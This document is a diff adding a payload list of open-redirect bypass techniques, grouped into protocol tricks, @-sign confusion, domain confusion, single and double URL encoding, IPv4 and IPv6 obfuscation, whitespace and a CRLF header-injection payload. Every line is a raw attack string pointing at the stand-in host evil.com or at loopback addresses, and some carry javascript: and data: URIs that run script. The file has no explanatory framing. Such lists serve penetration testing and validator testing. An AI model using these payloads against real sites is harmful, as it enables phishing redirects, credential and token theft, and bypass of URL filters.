@@ -1,0 +1,61 @@
+# ============================================================
+# Open Redirect — Bypass Techniques
+# ============================================================
+
+# ---- Protocol Tricks ----
+https://evil.com
+http://evil.com
+//evil.com
+///evil.com
+////evil.com
+/\evil.com
+\/evil.com
+javascript://evil.com%0aalert(1)
+data:text/html,<script>location='https://evil.com'</script>
+
+# ---- @ Trick ----
+https://target.com@evil.com
+https://target.com:pass@evil.com
+https://evil.com@target.com  (still goes to evil.com)
+@evil.com
+https://@evil.com
+
+# ---- Domain Confusion ----
+https://target.com.evil.com
+https://target.com-evil.com
+https://evil.com?continue=https://target.com
+https://evil.com#target.com
+https://target.com%60.evil.com
+
+# ---- URL Encoding ----
+https%3A%2F%2Fevil.com
+%2F%2Fevil.com
+%5C%5Cevil.com
+https://evil%2Ecom
+https://evil%00.com
+%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d
+
+# ---- Double Encoding ----
+%252F%252Fevil.com
+%2568%2574%2574%2570%253A%252F%252Fevil.com
+
+# ---- IPv6 ----
+https://[::1]
+https://[::FFFF:127.0.0.1]
+https://[0:0:0:0:0:ffff:127.0.0.1]
+
+# ---- IPv4 Obfuscation ----
+https://0177.0.0.1  (octal)
+https://2130706433  (decimal)
+https://0x7f000001  (hex)
+https://127.1
+
+# ---- Whitespace / Special ----
+https://evil.com %09
+https://evil.com%09
+https://evil.com%20
+https://evil.com%0a
+https://evil.com%0d
+
+# ---- CRLF in Redirect ----
+/redirect?url=https://target.com%0d%0aLocation: https://evil.com
